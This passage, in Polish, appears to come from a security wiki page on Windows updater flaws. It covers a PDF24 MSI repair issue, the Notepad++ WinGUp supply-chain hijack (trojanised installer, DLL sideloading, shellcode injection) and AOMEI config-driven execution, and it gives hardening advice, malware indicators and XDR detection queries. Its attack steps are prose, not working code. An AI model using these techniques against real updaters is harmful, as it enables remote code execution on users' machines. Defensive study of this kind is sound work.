PDF24 Creator 11.15.1 ilustruje odrębne ryzyko związane z naprawą MSI: niestandardowa akcja instalacji drukarki może podczas naprawy uruchomić widoczną konsolę z uprawnieniami SYSTEM. Dostawca zmienił instalator MSI w wersji 11.15.2, aby rozwiązać ten problem. Starsza wersja produktu to jedynie wskazówka do wstępnej analizy. Sprawdź zarejestrowany lub dostępny pakiet MSI, czy ten użytkownik może rozpocząć naprawę, czy obecna jest podatna niestandardowa akcja i opóźnienie związane z plikiem logu oraz czy interaktywny pulpit może ujawnić konsolę. Zgłoszone opóźnienie wykorzystywało oplock na `faxPrnInst.log`; zwykła możliwość zapisu do pliku nie jest jedynym warunkiem dostępu. Nieinteraktywna powłoka, niedostępny pakiet lub załatany instalator mogą przerwać ten łańcuch. Ten problem nie zależy od `AlwaysInstallElevated` i różni się od podmiany przewidywalnego skryptu tymczasowego.

---
## Zdalne przejęcie łańcucha dostaw przez słabą weryfikację updatera (WinGUp / Notepad++)

Od czerwca 2025 r. do grudnia 2025 r. atakujący, którzy przejęli infrastrukturę hostingową obsługującą przepływ aktualizacji Notepad++, selektywnie dostarczali wybranym ofiarom złośliwe manifesty. Starsze updatery oparte na WinGUp nie weryfikowały w pełni autentyczności aktualizacji, więc spreparowana odpowiedź XML mogła przekierować klientów na adresy URL kontrolowane przez atakujących. Ponieważ klient akceptował zawartość HTTPS bez wymuszania zarówno zaufanego łańcucha certyfikatów, jak i prawidłowego podpisu PE pobranego instalatora, ofiary pobierały i uruchamiały trojanizowany plik NSIS `update.exe`.<sup>[[12]](#references)[[13]](#references)</sup>

Przebieg ataku (nie wymaga lokalnego exploita):
1. **Przechwycenie infrastruktury**: przejęcie CDN/hostingu i odpowiadanie na sprawdzenia aktualizacji metadanymi atakującego, które wskazują złośliwy adres URL pobierania.
2. **Trojanizowany NSIS**: instalator pobiera/uruchamia payload i wykorzystuje dwa łańcuchy wykonania:
   - **Własny podpisany plik binarny + sideload**: dołącz podpisany plik Bitdefender `BluetoothService.exe` i umieść złośliwy `log.dll` w jego ścieżce wyszukiwania. Po uruchomieniu podpisanego pliku Windows ładuje przez sideload `log.dll`, który odszyfrowuje i ładuje refleksyjnie backdoora Chrysalis (zabezpieczonego przez Warbird + haszowanie API utrudniające statyczne wykrywanie).
   - **Wstrzykiwanie shellcode za pomocą skryptu**: NSIS uruchamia skompilowany skrypt Lua, który wykorzystuje Win32 API (np. `EnumWindowStationsW`) do wstrzyknięcia shellcode i przygotowania Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Wnioski dotyczące hardeningu/wykrywania dla każdego updatera:
- Wymuszaj **weryfikację certyfikatu + podpisu** pobranego instalatora (przypnij podpisującego dostawcy, odrzucaj niezgodny CN/łańcuch) i podpisuj sam manifest aktualizacji (np. XMLDSig). Blokuj przekierowania kontrolowane przez manifest, o ile nie zostały zweryfikowane.
- Traktuj **sideloading własnego podpisanego pliku binarnego (BYO)** jako punkt wykrywania po pobraniu: generuj alert, gdy podpisany plik EXE dostawcy ładuje DLL spoza kanonicznej ścieżki instalacji (np. Bitdefender ładuje `log.dll` z Temp/Downloads), a także gdy updater umieszcza w lokalizacji tymczasowej i uruchamia instalatory niepodpisane przez dostawcę.
- Monitoruj **artefakty charakterystyczne dla malware** zaobserwowane w tym łańcuchu (przydatne jako ogólne punkty odniesienia): mutex `Global\Jdhfv_1.0.1`, nietypowe zapisy `gup.exe` do `%TEMP%` oraz etapy wstrzykiwania shellcode sterowane przez Lua.
- Notepad++ zareagował, wzmacniając WinGUp w wersji v8.8.9 i nowszych: zwracany XML jest teraz podpisany (XMLDSig), a nowsze kompilacje wymuszają weryfikację certyfikatu + podpisu pobranego instalatora zamiast polegać wyłącznie na warstwie transportowej.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideloading <code>log.dll</code> przez EXE podpisany przez Bitdefender (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> uruchamiający instalator inny niż instalator Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Te wzorce można uogólnić na dowolny updater, który akceptuje niepodpisane manifesty lub nie weryfikuje podpisów instalatorów — przejęcie ruchu sieciowego + złośliwy instalator + sideloading z własnym podpisem umożliwiają zdalne wykonanie kodu pod pozorem „zaufanych” aktualizacji.

### Konfiguracja powiadomień jako drugi wyzwalacz aktualizacji

Updater może używać osobnych konfiguracji zdalnych do **przygotowania zawartości i wyzwolenia jej wykonania**. Wymaga to kontroli nad konfiguracjami lub ich odpowiedziami; raporty nie wskazują, w jaki sposób uzyskano dostęp do źródła. W przypadku AOMEI plik `down_html.ini` wybierał URL archiwum, wersję (`thrid`) i MD5 (`Val`); atakujący podwyższył wersję i jednocześnie zmienił URL oraz zgodną z nim sumę kontrolną. To opisany powyżej [błąd granicy zaufania metadanych](#2-hijacking-the-update-channel-to-run-code-as-system). Dodatkową ścieżką wykonania był plik `Notifycfg.ini`: wskazywał on `ABNotify.exe`, aby załadował rozpakowany plik `upgrade-now.html` przez lokalny URL `file:///` w WebView. Strona automatycznie przechodziła do sąsiedniego pliku wykonywalnego, który WebView przekazywał powłoce systemowej. Proces potomny dziedziczył uprawnienia procesu powiadamiającego; samo to nie podnosiło jego uprawnień do SYSTEM.<sup>[[17]](#references)[[18]](#references)</sup>

Google zgłosiło także zmodyfikowany plik `Notifycfg.ini` zawierający ponad 35 000 powtórzonych sekcji pozornych, które omijały normalną weryfikację wersji przez tego klienta. Raport nie potwierdza ogólnego obejścia parsera. Atakujący przywracali zdalne pliki po pięcio- do dziesięciominutowych oknach, więc zmienioną konfigurację otrzymywali tylko klienci odpytujący serwer w tym czasie. Ten kanał powiadomień służył również do odrębnej [przynęty wymuszającej WebDAV/NTLM](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion), która nie wymagała wykonania archiwum.<sup>[[18]](#references)</sup>

---
## References
- [1] [Porada bezpieczeństwa – Netskope Client dla Windows – lokalne podniesienie uprawnień za pomocą nieautoryzowanego serwera (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Porada bezpieczeństwa Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – wtyczka Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – klient/eksploit IPC Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – przejęcie ASUS DriverHub, MSI Center, Acer Control Centre i Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – lokalne podniesienie uprawnień przez zapisywalne pliki w Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – podniesienie uprawnień w agencie Windows](https://checkmk.com/werk/16361)
- [10] [PoC sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – aktorzy sponsorowani przez państwa wykorzystują łańcuch dostaw Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – aktualizacja dotycząca incydentu przejęcia infrastruktury](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – obejście poprawki CVE-2025-0309 w Netskope Client dla Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – odkrywanie błędów podnoszenia uprawnień w Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: od gRPC do SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [ManageEngine Threat Analysis Lab – naruszenie łańcucha dostaw AOMEI Backupper](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group i Mandiant – badanie efemerycznego naruszania łańcucha dostaw](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
